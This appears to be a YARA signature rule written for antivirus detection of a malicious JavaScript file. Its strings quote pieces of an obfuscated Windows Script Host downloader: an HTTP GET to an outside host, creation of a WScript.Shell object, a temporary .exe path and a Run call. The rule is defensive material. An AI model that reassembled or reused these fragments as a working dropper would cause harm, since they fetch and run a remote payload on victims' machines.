rule sig_20160401_9d06719d52a7a579ebcd29a169cbc5ce {
  meta:
    description = "datamaliciousorder - file 20160401_9d06719d52a7a579ebcd29a169cbc5ce.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "79f051320e8491ed3d347b89aeebc8261f81b1d8d37f5c5d45ca1144f61ada70"

  strings:
    $s1  = "CksHsm[XjAj](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/p2iskd\", false);" fullword ascii
    $s2  = "var IhsAe = function CrWh() {return WScript[TriNr](\"WScript\"+\".Shell\");}(), MzIdp = 11;" fullword ascii
    $s3  = "function NsbOro(PaJeg, DyHw){RfXt = RfXt * 1; return PaJeg - DyHw;};" fullword ascii
    $s4  = "if (CksHsm[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SfzBk() {return IhsAe[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"tsPoQO7PKi.ex\" + \"e\";};" fullword ascii
    $s6  = "function EqmSdn(){return LcvYm + \"\";};" fullword ascii
    $s7  = "function SsPhg() {return ((CiJaa == true) && (CiJaa == MlkYz)) ? 1 : RfXt;};" fullword ascii
    $s8  = "}while (SsUuv);" fullword ascii
    $s9  = "function RydEv(CbKw){IhsAe[\"R\"+\"un\"](CbKw, RfXt, RfXt);};" fullword ascii
    $s10 = "function BdSk(HgmYc) {var FsjJvz = (1, 2, 3, 4, 5, HgmYc); return FsjJvz;};" fullword ascii
    $s11 = "CiJaa = true; " fullword ascii
    $s12 = "var CiJaa = false;" fullword ascii
    $s13 = "MlkYz = true; " fullword ascii
    $s14 = "function WypJv(){return TriNr;};" fullword ascii
    $s15 = "var EllTk = new this[\"Date\"]();" fullword ascii
    $s16 = "function XsNwh()" fullword ascii
    $s17 = "var MlkYz = false;" fullword ascii
    $s18 = "var HjOu = false;" fullword ascii
    $s19 = "return NsbOro(WxwFkh, IanOym);" fullword ascii
    $s20 = "function HwNuj(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}